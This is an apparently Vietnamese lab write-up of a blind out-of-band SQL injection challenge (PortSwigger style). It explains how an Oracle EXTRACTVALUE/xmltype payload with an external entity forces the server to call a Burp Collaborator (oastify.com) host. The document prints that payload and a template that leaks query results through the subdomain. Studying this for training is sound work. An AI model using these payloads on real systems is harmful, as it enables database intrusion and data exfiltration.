![image](https://github.com/user-attachments/assets/cd837e4e-b0f6-4874-919e-6648d5e806e1)

Blind SQL Injection với OOB có thể xác định bằng cách gây ra một request DNS/HTTP ra bên ngoài.

Thì bắt đầu challenge này cũng như bao challenge khác là phải xác định được dbms.

Vì ở đây là blind, lại còn là loại oob nữa nên chúng ta chỉ có cách brute force thôi, bạn cứ thử hết các loại dbms trong cheet sheet dưới đây.

```
'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//312v9d892ym7ib5zaunls6ucz35utkh9.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--

SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
```

**EXTRACTVALUE(xml, xpath) là gì?**

Trong Oracle, hàm EXTRACTVALUE(xml, xpath) dùng để trích xuất dữ liệu từ một đối tượng XML dựa trên đường dẫn XPath.

Ví dụ:

```
SELECT EXTRACTVALUE(XMLTYPE('<root><item>Test</item></root>'), '/root/item') FROM dual;
```

XMLTYPE('<root><item>Test</item></root>'): Chuyển chuỗi thành XML.

EXTRACTVALUE(..., '/root/item'): Truy xuất nội dung trong <item>, trả về "Test".

**Vậy /l trong payload làm gì?**

```
EXTRACTVALUE(xmltype('<!DOCTYPE root [<!ENTITY % remote SYSTEM "http://312v9d892ym7ib5zaunls6ucz35utkh9.oastify.com/"> %remote;]>'), '/l')
```

/l là một XPath không tồn tại, vì trong XML khai báo DTD này không có phần tử nào tên "l".

Điều này làm cho EXTRACTVALUE gặp lỗi.

Trong Oracle, lỗi EXTRACTVALUE sẽ hiển thị nội dung XML đã phân tích, bao gồm cả External Entity.

Kết quả là máy chủ thực hiện request đến URL Burp Collaborator.

**Tại sao lại cố ý gây lỗi?**

Dữ liệu XML có thể chứa external entity.

EXTRACTVALUE sẽ cố truy vấn XPath /l nhưng không tìm thấy -> Lỗi xảy ra.

Lỗi chứa nội dung của XML, giúp ta kích hoạt XXE và làm server gửi request đến Burp Collaborator.

'/l' chỉ là một XPath giả mạo để gây lỗi, nhằm buộc Oracle xử lý external entity và thực hiện request OOB đến Burp Collaborator.

Trong Oracle, cách EXTRACTVALUE(xml, xpath) hoạt động phụ thuộc vào việc XPath có tồn tại trong XML hay không.

| **Trường hợp**                 | **Kết quả**                                           |
|---------------------------------|------------------------------------------------------|
| XPath tồn tại (`/root/data`)    | Trả về nội dung XML, **KHÔNG** gây lỗi               |
| XPath không tồn tại (`/l`)      | Oracle báo lỗi, **có thể kích hoạt XXE**             |


![image](https://github.com/user-attachments/assets/e9b37074-c41b-4bf6-a6dc-3d7ae9c5a45e)

![image](https://github.com/user-attachments/assets/225dfa95-295c-47ed-b05a-9ce1b53e8401)

Vậy là thành công r đó

## REFERENCE
[1]. https://portswigger.net/web-security/sql-injection/cheat-sheet
